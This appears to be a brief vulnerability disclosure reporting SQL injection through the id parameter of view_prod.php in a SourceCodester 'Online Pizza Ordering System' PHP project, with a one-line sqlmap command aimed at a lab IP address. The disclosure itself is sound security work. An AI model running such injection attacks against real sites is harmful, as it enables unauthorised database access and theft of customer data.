vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20230223204548542](C:\markdown\images\image-20230223204548542.png)

exp

```
sqlmap.py -u "http://192.168.31.50/php-opos/view_prod.php?id=1"
```

![image-20230223204651364](C:\markdown\images\image-20230223204651364.png)